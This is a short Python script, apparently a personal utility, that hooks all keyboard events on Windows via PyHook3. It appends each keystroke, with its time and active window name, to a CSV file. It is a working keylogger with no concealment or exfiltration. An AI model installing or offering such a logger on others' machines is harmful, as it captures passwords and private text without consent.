# -*- coding: utf-8 -*-
"""
Created on Fri Aug 14 15:58:13 2020

@author: ShawnXiong
"""


import pythoncom
import PyHook3

import pandas as pd
import tool

record = {}
flag = 0
file_path = "Key_RE.csv"



def onMouseEvent(event):
    # 监听鼠标事件
    print("MessageName:", event.MessageName)
    print("Message:", event.Message)
    print("Time:", event.Time)
    print("Window:", event.Window)
    print("WindowName:", event.WindowName)
    print("Position:", event.Position)
    print("Wheel:", event.Wheel)
    print("Injected:", event.Injected)
    print("---")

    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True


def onKeyboardEvent(event):
    # 监听键盘事件
    
    
    record["Time"] = event.Time
    record["Key"] = event.Key
    record["Ascii"] = chr(event.Ascii)
    record["WindowName:"] = event.WindowName
    
    df_of_record = pd.DataFrame([record])
    

    # tool.dataframe_to_CSV(df_of_record, file_path, Index = False)
    df_of_record.to_csv(file_path, mode = "a", index = False, encoding = 'utf_8_sig', header = False)
    
    print( "Time:", event.Time  ) 
    print( "WindowName:", event.WindowName    )
    print( "Ascii:", event.Ascii, chr(event.Ascii)    ) 
    print( "Key:", event.Key     )
    
    
    # print("MessageName:", event.MessageName)
    # print("Message:", event.Message)
    # print("Time:", event.Time)
    # print("Window:", event.Window)
    # print("WindowName:", event.WindowName)
    # print("Ascii:", event.Ascii, chr(event.Ascii))
    # print("Key:", event.Key)
    # print("KeyID:", event.KeyID)
    # print("ScanCode:", event.ScanCode)
    # print("Extended:", event.Extended)
    # print("Injected:", event.Injected)
    # print("Alt", event.Alt)
    # print("Transition", event.Transition)
    print("---")
    # 同鼠标事件监听函数的返回值
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = PyHook3.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
    # # 监听所有鼠标事件
    # hm.MouseAll = onMouseEvent
    # # 设置鼠标“钩子”
    # hm.HookMouse()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()